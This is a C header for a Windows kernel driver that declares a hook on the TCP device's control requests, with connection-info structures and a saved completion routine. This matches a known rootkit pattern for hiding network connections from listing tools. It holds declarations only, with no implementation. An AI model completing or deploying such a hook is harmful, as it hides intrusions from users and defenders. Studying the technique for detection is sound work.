#pragma once
#include <ntddk.h>
#include <wsk.h>


#define IOCTL_TCP_QUERY_INFORMATION_EX 0x00120003
#define HTONS(a)  (((0xFF&a)<<8) + ((0xFF00&a)>>8))
typedef struct _CONNINFO101 {
	unsigned long status;
	unsigned long src_addr;
	unsigned short src_port;
	unsigned short unk1;
	unsigned long dst_addr;
	unsigned short dst_port;
	unsigned short unk2;
} CONNINFO101, * PCONNINFO101;

typedef struct _CONNINFO102 {
	unsigned long status;
	unsigned long src_addr;
	unsigned short src_port;
	unsigned short unk1;
	unsigned long dst_addr;
	unsigned short dst_port;
	unsigned short unk2;
	unsigned long pid;
} CONNINFO102, * PCONNINFO102;

typedef struct _CONNINFO110 {
	unsigned long size;
	unsigned long status;
	unsigned long src_addr;
	unsigned short src_port;
	unsigned short unk1;
	unsigned long dst_addr;
	unsigned short dst_port;
	unsigned short unk2;
	unsigned long pid;
	PVOID    unk3[35];
} CONNINFO110, * PCONNINFO110;

typedef struct _REQINFO {
	PIO_COMPLETION_ROUTINE OldCompletion;
	unsigned long          ReqType;
} REQINFO, * PREQINFO;

NTSTATUS InstallHook();
NTSTATUS TcpHookedDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS UnhookTCP();
NTSTATUS TcpHookIoCompletionRoutine(IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp,
	IN PVOID Context);